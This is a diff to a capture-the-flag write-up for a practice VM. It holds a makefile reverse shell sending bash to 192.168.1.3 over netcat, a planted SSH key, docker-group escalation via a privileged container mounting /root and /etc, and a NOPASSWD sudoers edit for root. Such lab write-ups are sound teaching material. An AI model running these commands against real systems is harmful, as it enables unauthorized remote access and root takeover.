@@ -140,19 +140,19 @@ When I killed the server, it came back shortly. Doing a whoami, however, reveale
 
 ## Learning how sudo works, again
 
-I went back to look at make, which sudo -l told me I could use. It said (dusk) NOPASSWD, so why was I getting a sudo prompt when I ran it with sudo /usr/bin/make? Eventually I figured it out: sudo -l was telling me I could use sudo to act as dusk for the command, but I needed to specify dusk when running sudo!
+I went back to look at make, which sudo -l told me I could use. It said `(dusk) NOPASSWD`, so why was I getting a sudo prompt when I ran it with `sudo /usr/bin/make`? Eventually I figured it out: `sudo -l` was telling me I could use sudo to act as dusk for the command, but I needed to specify dusk when running sudo!
 
 I created a makefile for a reverse netcat using `printf "all:\n\tnc 192.168.1.3 6666 -e /bin/bash" > makefile`, then ran it with `sudo -u dusk /usr/bin/make`, and sure enough it worked and I had a dusk shell :D
 
-I went to the home dir for dusk, created .ssh/authorized_keys with my kali's public ssh key, chmod 644 for authorized_keys and chmod 700 for .ssh, and finally was able to remotely ssh in for a proper shell.
+I went to the home dir for dusk, created `.ssh/authorized_keys` with my kali's public ssh key, `chmod 644` for authorized_keys and `chmod 700` for .ssh, and finally was able to remotely ssh in for a proper shell.
 
 ## Recon as dusk, docker and win!
 
-dusk couldn't run sudo -l. There was also nothing in their user dir of use. I used a find command to find everything they owned and their was nothing useful. Their mail inbox contained only a test email I had sent the previous day.
+dusk couldn't run sudo -l. There was also nothing in their user dir of use. I used a find command to find everything they owned and there was nothing useful. Their mail inbox contained only a test email I had sent the previous day.
 
-Ultimately I ran linenum.sh (using nano to create it) and found that docker was running on the host, with dusk as a group member! Problem was, no containers were running and no images were available, and I had setup the vm so it couldn't access the net as a precaution.
+Ultimately I ran [linenum.sh](https://github.com/rebootuser/LinEnum) (using nano to create it) and found that docker was running on the host, with dusk as a group member! Problem was, no containers were running and no images were available, and I had setup the vm so it couldn't access the net as a precaution.
 
-I downloaded busybox on my main pc, and saved it to a tar file. Then I used a vbox shared folder to get it into kali, before finally scp'ing it to the dusk vm. Finally, I used the following command to get a shell in a container with access to the parent system: `docker run --privileged -v /root:/tmp -ti busybox`
+I downloaded busybox on my macbook which runs docker, and saved it to a tar file (`docker pull busybox` and then `docker save busybox > busybox.tar`). Then I used a vbox shared folder to get it into kali, before finally scp'ing it to the dusk vm and loading it (`docker load --input busybox.tar`). Finally, I used the following command to get a shell in a container with access to the parent system: `docker run --privileged -v /root:/tmp -ti busybox`
 
 This gave me access to the flag file:
 
@@ -194,6 +194,6 @@ Until then!
 
 However I wanted to get actual root on the machine, so I mounted the etc folder: `docker run --privileged -v /etc:/tmp -ti busybox`
 
-Then I added `dusk    ALL=(ALL) NOPASSWD:ALL` under www-data's sudoer entry, and saved with `:wq!` (the exclamation because it was readonly). 
+Then I used `vi sudoers` and added `dusk    ALL=(ALL) NOPASSWD:ALL` under www-data's sudoer entry, and saved with `:wq!` (the exclamation because it was readonly). 
 
 Back on the host, `sudo -i` now gave me root :)
